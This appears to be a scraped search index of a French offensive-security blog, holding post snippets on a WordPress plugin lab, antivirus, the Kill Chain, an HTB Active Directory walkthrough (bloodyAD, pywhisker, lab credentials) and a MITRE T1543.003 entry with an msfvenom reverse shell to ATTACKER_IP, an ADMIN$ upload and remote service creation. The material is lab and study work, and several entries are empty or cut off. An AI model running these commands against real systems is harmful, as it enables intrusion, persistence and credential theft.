name=\u0026#34;generator\u0026#34; content=\u0026#34;WordPress 6.7.1\u0026#34; /\u0026gt; ","permalink":"https://nyobemichel.me/posts/labs/vulnerable-canto-wordpress-plugin/","summary":"\u003cp\u003eEn tant que membre de l\u0026rsquo;équipe rouge de Secure Corp, votre mission est d\u0026rsquo;exploiter une vulnérabilité dans un plugin WordPress utilisé pour la gestion des ressources numériques. Cette faille peut permettre un accès distant non autorisé au serveur, vous permettant ainsi de compromettre le système en exécutant du code arbitraire.\u003c/p\u003e\n\u003ch1 id=\"enumeration\"\u003eEnumeration\u003c/h1\u003e\n\u003ch2 id=\"nmap\"\u003eNmap\u003c/h2\u003e\n\u003cp\u003eversion de wordpress  \u003ccode\u003eWordPress 6.7.1\u003c/code\u003e\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecurl -s -X GET https://red.infinity.cyberwarfare.live/jf159070e9264f91970a7b64e17d775t/ | grep \u0026#39;\u0026lt;meta name=\u0026#34;generator\u0026#34;\u0026#39; \n\u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;WordPress 6.7.1\u0026#34; /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e","title":""},{"content":"Les logiciels antivirus ( AV ) sont l\u0026rsquo;une des solutions de sécurité essentielles pour détecter et prévenir les attaques de logiciels malveillants sur la machine de l\u0026rsquo;utilisateur final .\nTechniques de détection Une technique de détection AV recherche et détecte les fichiers malveillants ; différentes techniques de détection peuvent être utilisées au sein du moteur AV , notamment :\nLa détection basée sur les signatures est la technique AV traditionnelle qui recherche des modèles et des signatures malveillants prédéfinis dans les fichiers. La détection heuristique est une technique plus avancée qui comprend diverses méthodes comportementales pour analyser les fichiers suspects. La détection dynamique est une technique qui comprend la surveillance des appels système et des API, ainsi que les tests et les analyses dans un environnement isolé. ","permalink":"https://nyobemichel.me/posts/learn/antivirus/","summary":"\u003cp\u003eLes logiciels antivirus ( AV ) sont l\u0026rsquo;une des solutions de sécurité essentielles pour détecter et prévenir les attaques de logiciels malveillants sur la machine de l\u0026rsquo;utilisateur final .\u003c/p\u003e\n\u003ch1 id=\"techniques-de-détection\"\u003eTechniques de détection\u003c/h1\u003e\n\u003cp\u003eUne technique de détection AV recherche et détecte les fichiers malveillants ; différentes techniques de détection peuvent être utilisées au sein du moteur AV , notamment :\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLa détection basée sur les signatures est la technique AV traditionnelle qui recherche des modèles et des signatures malveillants prédéfinis dans les fichiers.\u003c/li\u003e\n\u003cli\u003eLa détection heuristique est une technique plus avancée qui comprend diverses méthodes comportementales pour analyser les fichiers suspects.\u003c/li\u003e\n\u003cli\u003eLa détection dynamique est une technique qui comprend la surveillance des appels système et des API, ainsi que les tests et les analyses dans un environnement isolé.\u003c/li\u003e\n\u003c/ul\u003e","title":""},{"content":"Inspirée des chaînes de destruction militaires, la Cyber ​​Kill Chain est un cadre de cybersécurité introduit par Lockheed Martin en 2011. Elle vise à aider les organisations à se défendre contre les cyberattaques en comprenant leur déroulement. La Cyber ​​Kill Chain divise une attaque en sept étapes :\nReconnaissance : Dans la première étape, l\u0026rsquo;attaquant recueille des informations sur la cible Armement : Une fois la reconnaissance appropriée effectuée, l\u0026rsquo;attaquant crée une charge utile livrable ou modifie une charge utile existante en fonction des vulnérabilités du système cible Livraison : Une fois prête, l\u0026rsquo;attaquant envoie la charge utile armée à la cible Exploitation : Une fois exécutée, la charge utile exploite une vulnérabilité dans le système de la cible Installation : L\u0026rsquo;exploitation permet à l\u0026rsquo;attaquant d\u0026rsquo;installer une porte dérobée ou un logiciel malveillant pour maintenir la persistance dans l\u0026rsquo;environnement de la cible Commande et contrôle ( C2 ) : En utilisant la porte dérobée installée, l\u0026rsquo;attaquant peut contrôler le système compromis Actions sur les objectifs : En arrivant jusqu\u0026rsquo;ici, l\u0026rsquo;attaquant peut désormais effectuer d\u0026rsquo;autres actions telles que l\u0026rsquo;exfiltration de données ou l\u0026rsquo;exploitation d\u0026rsquo;autres systèmes Reconnaissance La reconnaissance trouve son origine dans le domaine militaire et désigne l\u0026rsquo;acte de recueillir des informations sur une cible. En cybersécurité, cette étape consiste à recueillir des informations sur les vulnérabilités et les faiblesses de la cible afin de découvrir des points d\u0026rsquo;entrée potentiels.\n","permalink":"https://nyobemichel.me/posts/learn/cyber-kill-chain/","summary":"\u003cp\u003eInspirée des chaînes de destruction militaires, la Cyber ​​Kill Chain est un cadre de cybersécurité introduit par Lockheed Martin en 2011. Elle vise à aider les organisations à se défendre contre les cyberattaques en comprenant leur déroulement.\nLa Cyber ​​Kill Chain divise une attaque en sept étapes :\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eReconnaissance\u003c/strong\u003e : Dans la première étape, l\u0026rsquo;attaquant recueille des informations sur la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eArmement\u003c/strong\u003e : Une fois la reconnaissance appropriée effectuée, l\u0026rsquo;attaquant crée une charge utile livrable ou modifie une charge utile existante en fonction des vulnérabilités du système cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLivraison\u003c/strong\u003e : Une fois prête, l\u0026rsquo;attaquant envoie la charge utile armée à la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExploitation\u003c/strong\u003e : Une fois exécutée, la charge utile exploite une vulnérabilité dans le système de la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInstallation\u003c/strong\u003e : L\u0026rsquo;exploitation permet à l\u0026rsquo;attaquant d\u0026rsquo;installer une porte dérobée ou un logiciel malveillant pour maintenir la persistance dans l\u0026rsquo;environnement de la cible\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommande et contrôle ( C2 )\u003c/strong\u003e : En utilisant la porte dérobée installée, l\u0026rsquo;attaquant peut contrôler le système compromis\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActions sur les objectifs\u003c/strong\u003e : En arrivant jusqu\u0026rsquo;ici, l\u0026rsquo;attaquant peut désormais effectuer d\u0026rsquo;autres actions telles que l\u0026rsquo;exfiltration de données ou l\u0026rsquo;exploitation d\u0026rsquo;autres systèmes\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eLa reconnaissance trouve son origine dans le domaine militaire et désigne l\u0026rsquo;acte de recueillir des informations sur une cible. En cybersécurité, cette étape consiste à recueillir des informations sur les vulnérabilités et les faiblesses de la cible afin de découvrir des points d\u0026rsquo;entrée potentiels.\u003c/p\u003e","title":""},{"content":"Qu\u0026rsquo;est-ce que l\u0026rsquo;exfiltration de données L\u0026rsquo;exfiltration de données consiste à copier des données sensibles de manière non autorisée et à les transférer de l\u0026rsquo;intérieur du réseau d\u0026rsquo;une organisation vers l\u0026rsquo;extérieur.\nIl existe trois principaux scénarios d’utilisation de l’exfiltration de données, notamment :\nExfiltrer les données Communications de commandement et de contrôle. Tunneling Exfiltration à l\u0026rsquo;aide du socket TCP ","permalink":"https://nyobemichel.me/posts/learn/exfiltration-de-donn%C3%A9es/","summary":"\u003ch1 id=\"quest-ce-que-lexfiltration-de-données\"\u003eQu\u0026rsquo;est-ce que l\u0026rsquo;exfiltration de données\u003c/h1\u003e\n\u003cp\u003eL\u0026rsquo;exfiltration de données consiste à copier des données sensibles de manière non autorisée et à les transférer de l\u0026rsquo;intérieur du réseau d\u0026rsquo;une organisation vers l\u0026rsquo;extérieur.\u003c/p\u003e\n\u003cp\u003eIl existe trois principaux scénarios d’utilisation de l’exfiltration de données, notamment :\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eExfiltrer les données\u003c/li\u003e\n\u003cli\u003eCommunications de commandement et de contrôle.\u003c/li\u003e\n\u003cli\u003eTunneling\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"exfiltration-à-laide-du-socket-tcp\"\u003eExfiltration à l\u0026rsquo;aide du socket TCP\u003c/h2\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/learn/identity-secure-score/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/learn/lacc%C3%A8s-conditionnel/","summary":"","title":""},{"content":"Static Application Security Testing\n","permalink":"https://nyobemichel.me/posts/learn/sast/","summary":"\u003cp\u003eStatic Application Security Testing\u003c/p\u003e","title":""},{"content":"Méthodes de transfert de fichiers Windows ","permalink":"https://nyobemichel.me/posts/learn/transferts-de-fichiers/","summary":"\u003ch1 id=\"méthodes-de-transfert-de-fichiers-windows\"\u003eMéthodes de transfert de fichiers Windows\u003c/h1\u003e","title":""},{"content":"https://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\n","permalink":"https://nyobemichel.me/posts/learn/zero-trust---securing-identity/","summary":"\u003cp\u003e\u003ca href=\"https://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\"\u003ehttps://learn.microsoft.com/en-us/security/zero-trust/deploy/identity\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"Enumeration Nmap nmap -sV -sC 10.10.11.41 -v --min-rate 1000 -Pn -T4 -p- PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-08-03 11:05:11Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea |_ssl-date: 2025-08-03T11:06:41+00:00; +7h00m00s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea |_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED | Issuer: commonName=certified-DC01-CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-06-11T21:04:20 | Not valid after: 2105-05-23T21:04:20 | MD5: 3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258 |_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea |_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49689/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49690/tcp open msrpc Microsoft Windows RPC 49691/tcp open msrpc Microsoft Windows RPC 49720/tcp open msrpc Microsoft Windows RPC 49728/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-08-03T11:06:04 |_ start_date: N/A |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required python3 bloodyAD.py \u0026ndash;host \u0026ldquo;10.10.11.41\u0026rdquo; -d \u0026ldquo;certified.htb\u0026rdquo; -u \u0026ldquo;judith.mader\u0026rdquo; -p \u0026ldquo;judith09\u0026rdquo; set owner management judith.mader\n[*] Current owner information below [*] - SID: S-1-5-21-729746778-2675978091-3820388244-512 [*] - sAMAccountName: Domain Admins [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb [*] OwnerSid modified successfully! impacket-dacledit -action \u0026lsquo;write\u0026rsquo; -rights \u0026lsquo;FullControl\u0026rsquo; -inheritance -principal \u0026lsquo;judith.mader\u0026rsquo; -target \u0026lsquo;management\u0026rsquo; \u0026ldquo;certified.htb\u0026rdquo;/\u0026ldquo;judith.mader\u0026rdquo;:\u0026lsquo;judith09\u0026rsquo;\n[*] DACL backed up to dacledit-20250803-071545.bak [*] DACL modified successfully! net rpc group addmem \u0026ldquo;management\u0026rdquo; \u0026ldquo;judith.mader\u0026rdquo; -U \u0026ldquo;certified.htb\u0026rdquo;/\u0026ldquo;judith.mader\u0026rdquo;%\u0026lsquo;judith09\u0026rsquo; -S \u0026ldquo;dc01.certified.htb\u0026rdquo;\npython3 pywhisker.py -d \u0026#34;certified.htb\u0026#34; -u \u0026#34;judith.mader\u0026#34; -p \u0026#34;judith09\u0026#34; --target \u0026#34;management_svc\u0026#34; --action \u0026#34;add\u0026#34; [*] Searching for the target account [*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: 56f8749d-270a-9078-813b-876958ecf1bf [*] Updating the msDS-KeyCredentialLink attribute of management_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Converting PEM -\u0026gt; PFX with cryptography: 58SLNMUb.pfx [+] PFX exportiert nach: 58SLNMUb.pfx [i] Passwort für PFX: 0axzLWh7cg6d1speQvbf [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: 58SLNMUb.pfx [*] Must be used with password: 0axzLWh7cg6d1speQvbf [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools ","permalink":"https://nyobemichel.me/posts/machine/certified---htb/","summary":"\u003ch1 id=\"enumeration\"\u003eEnumeration\u003c/h1\u003e\n\u003ch2 id=\"nmap\"\u003eNmap\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -sV -sC 10.10.11.41 -v  --min-rate \u003cspan class=\"m\"\u003e1000\u003c/span\u003e -Pn -T4 -p-\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-03 11:05:11Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n|_ssl-date: 2025-08-03T11:06:41+00:00; +7h00m00s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED\n| Issuer: commonName=certified-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-06-11T21:04:20\n| Not valid after:  2105-05-23T21:04:20\n| MD5:   3b59:90a0:ed2e:5d54:1f81:c21d:c0f0:1258\n|_SHA-1: c77f:527a:24d3:9c55:fda8:fadf:269f:7958:9c88:baea\n|_ssl-date: 2025-08-03T11:06:40+00:00; +7h00m01s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49666/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49691/tcp open  msrpc         Microsoft Windows RPC\n49720/tcp open  msrpc         Microsoft Windows RPC\n49728/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-08-03T11:06:04\n|_  start_date: N/A\n|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003epython3 bloodyAD.py  \u0026ndash;host \u0026ldquo;10.10.11.41\u0026rdquo; -d \u0026ldquo;certified.htb\u0026rdquo; -u \u0026ldquo;judith.mader\u0026rdquo; -p \u0026ldquo;judith09\u0026rdquo; set owner management judith.mader\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/microsoft/mouvement-lat%C3%A9ral-et-pivotement/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/microsoft/ntlm-authentication/","summary":"","title":""},{"content":"Tunneling SSH Le tunneling SSH peut être utilisé de différentes manières pour rediriger des ports via une connexion SSH , selon la situation. Pour expliquer chaque cas, imaginons que nous ayons pris le contrôle de la machine PC-1 (sans accès administrateur) et que nous souhaitions l\u0026rsquo;utiliser comme pivot pour accéder à un port d\u0026rsquo;une autre machine auquel nous ne pouvons pas nous connecter directement. Nous allons créer un tunnel depuis la machine PC-1, agissant comme client SSH , vers le PC de l\u0026rsquo;attaquant, qui agira comme serveur SSH . En effet, les machines Windows disposent souvent d\u0026rsquo;un client SSH , mais la plupart du temps, aucun serveur SSH n\u0026rsquo;est disponible. Étant donné que nous allons établir une connexion avec la machine de notre attaquant, nous voudrons créer un utilisateur sans accès à aucune console pour le tunneling et définir un mot de passe à utiliser pour créer les tunnels :\nuseradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser ","permalink":"https://nyobemichel.me/posts/microsoft/redirection-de-port/","summary":"\u003ch1 id=\"tunneling-ssh\"\u003eTunneling SSH\u003c/h1\u003e\n\u003cp\u003eLe tunneling SSH peut être utilisé de différentes manières pour rediriger des ports via une connexion SSH , selon la situation. Pour expliquer chaque cas, imaginons que nous ayons pris le contrôle de la machine PC-1 (sans accès administrateur) et que nous souhaitions l\u0026rsquo;utiliser comme pivot pour accéder à un port d\u0026rsquo;une autre machine auquel nous ne pouvons pas nous connecter directement. Nous allons créer un tunnel depuis la machine PC-1, agissant comme client SSH , vers le PC de l\u0026rsquo;attaquant, qui agira comme serveur SSH . En effet, les machines Windows disposent souvent d\u0026rsquo;un client SSH , mais la plupart du temps, aucun serveur SSH n\u0026rsquo;est disponible.\n\u003cimg alt=\"SSh tunneling\" loading=\"lazy\" src=\"/images/ssh_tunneling.png\"\u003e\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/microsoft/sans-titre/","summary":"","title":""},{"content":"Processus Un processus possède un espace d\u0026rsquo;adressage virtuel, du code exécutable, des handles ouverts vers des objets système, un contexte de sécurité, un identifiant de processus unique, des variables d\u0026rsquo;environnement, une classe de priorité, des tailles minimale et maximale de jeu de travail et au moins un thread d\u0026rsquo;exécution. »\nThreads https://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\n","permalink":"https://nyobemichel.me/posts/microsoft/windows-internal/","summary":"\u003ch1 id=\"processus\"\u003eProcessus\u003c/h1\u003e\n\u003cp\u003eUn processus possède un espace d\u0026rsquo;adressage virtuel, du code exécutable, des handles ouverts vers des objets système, un contexte de sécurité, un identifiant de processus unique, des variables d\u0026rsquo;environnement, une classe de priorité, des tailles minimale et maximale de jeu de travail et au moins un thread d\u0026rsquo;exécution. »\u003c/p\u003e\n\u003ch1 id=\"threads\"\u003eThreads\u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"https://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\"\u003ehttps://learn.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"Les pirates peuvent créer ou modifier des services Windows pour exécuter de manière répétée des charges malveillantes dans le cadre de la persistance. Au démarrage de Windows, des programmes ou applications appelés services exécutent des fonctions système en arrière-plan. (Citation : TechNet Services) Les informations de configuration des services Windows, notamment le chemin d\u0026rsquo;accès aux fichiers exécutables ou aux programmes/commandes de récupération, sont stockées dans le Registre Windows.\nExample Creation d\u0026rsquo;un shell inverse\nmsfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe Nous avons télécharger notre charge utile sur le partage ADMIN$\nsmbclient -c \u0026#39;put myservice.exe\u0026#39; -U $name$ -W $domaine \u0026#39;//$partage$/admin$/\u0026#39; $password$ Une fois notre exécutable téléchargé, nous allons configurer un écouteur sur la machine de l\u0026rsquo;attaquant pour recevoir le reverse shell de msfconsole:\nmsfconsole -q -x \u0026#34;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $IP$; set LPORT 4444;exploit\u0026#34; Et enfin, procédez à la création d\u0026rsquo;un nouveau service à distance en utilisant sc, en l\u0026rsquo;associant à notre binaire téléchargé\nC:\\\u0026gt; sc.exe \\\\DossierPartage create service-3249 binPath= \u0026#34;%windir%\\myservice.exe\u0026#34; start= auto C:\\\u0026gt; sc.exe \\\\DossierPartage start service-3249 https://attack.mitre.org/techniques/T1543/003/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md?plain=1\n","permalink":"https://nyobemichel.me/posts/mitre/t1543-003---create-or-modify-system-process-windows-service/","summary":"\u003cp\u003eLes pirates peuvent créer ou modifier des services Windows pour exécuter de manière répétée des charges malveillantes dans le cadre de la persistance. Au démarrage de Windows, des programmes ou applications appelés services exécutent des fonctions système en arrière-plan. (Citation : TechNet Services) Les informations de configuration des services Windows, notamment le chemin d\u0026rsquo;accès aux fichiers exécutables ou aux programmes/commandes de récupération, sont stockées dans le Registre Windows.\u003c/p\u003e\n\u003ch4 id=\"example\"\u003eExample\u003c/h4\u003e\n\u003cp\u003eCreation d\u0026rsquo;un shell inverse\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/outils/crunch/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/outils/impacket/","summary":"","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/outils/metasploit/","summary":"","title":""},{"content":"Mimikatz est un outil de post-exploitation très populaire et puissant, le plus souvent utilisé pour vider les informations d\u0026rsquo;identification des utilisateurs à l\u0026rsquo;intérieur d\u0026rsquo;un réseau d\u0026rsquo;annuaire actif. Cependant, nous utiliserons Mimikatz afin de créer un ticket argenté.\nhttps://github.com/ParrotSec/mimikatz\n","permalink":"https://nyobemichel.me/posts/outils/mimikatz/","summary":"\u003cp\u003eMimikatz est un outil de post-exploitation très populaire et puissant, le plus souvent utilisé pour vider les informations d\u0026rsquo;identification des utilisateurs à l\u0026rsquo;intérieur d\u0026rsquo;un réseau d\u0026rsquo;annuaire actif. Cependant, nous utiliserons Mimikatz afin de créer un ticket argenté.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/ParrotSec/mimikatz\"\u003ehttps://github.com/ParrotSec/mimikatz\u003c/a\u003e\u003c/p\u003e","title":""},{"content":"Example d\u0026rsquo;un écouteur Netcat\nnc -lvnp 7777 connexion\nnc -nv 10.129.41.200 7777 ","permalink":"https://nyobemichel.me/posts/outils/netcat/","summary":"\u003cp\u003eExample d\u0026rsquo;un écouteur Netcat\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e nc -lvnp \u003cspan class=\"m\"\u003e7777\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003econnexion\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-Bash\" data-lang=\"Bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -nv 10.129.41.200 \u003cspan class=\"m\"\u003e7777\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":""},{"content":"un outil de test de pénétration open source qui teste la sécurité des bases de données Oracle à distance. Grâce à ODAT, vous pouvez :\nrechercher un SID valide sur un écouteur de base de données Oracle distant via : une attaque par dictionnaire une attaque par force brute ALIAS de l\u0026rsquo;auditeur rechercher des comptes Oracle en utilisant : une attaque par dictionnaire chaque utilisateur Oracle aime le mot de passe (besoin d\u0026rsquo;un compte avant d\u0026rsquo;utiliser cette attaque) exécuter des commandes système sur le serveur de base de données en utilisant : DBMS_SCHEDULER JAVA tables externes oradbg télécharger les fichiers stockés sur le serveur de base de données en utilisant : FICHIER_UTL DBMS_XSLPROCESSOR tables externes CTXSYS DBMS_LOB télécharger des fichiers sur le serveur de base de données en utilisant : FICHIER_UTL DBMS_XSLPROCESSOR DBMS_ADVISOR supprimer des fichiers en utilisant : FICHIER_UTL obtenez un accès privilégié en utilisant les combinaisons de privilèges système suivantes (voir l\u0026rsquo;aide pour les commandes du module privesc ) : CRÉER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE CRÉER UNE PROCÉDURE et EXÉCUTER N\u0026rsquo;IMPORTE QUELLE PROCÉDURE CRÉER N\u0026rsquo;IMPORTE QUEL DÉCLENCHEUR (ET CRÉER UNE PROCÉDURE) ANALYSER TOUT (ET CRÉER UNE PROCÉDURE) CRÉER N\u0026rsquo;IMPORTE QUEL INDEX (ET CRÉER UNE PROCÉDURE) envoyer/recevoir des requêtes HTTP depuis le serveur de base de données en utilisant : UTL_HTTP HttpUriType scanner les ports du serveur local ou d\u0026rsquo;un serveur distant en utilisant : UTL_HTTP HttpUriType UTL_TCP capturer une authentification SMB via : un index afin de déclencher une connexion SMB exploiter certains CVE : la CVE-2012-3137 récupérer la clé de session et le sel pour des utilisateurs arbitraires attaque 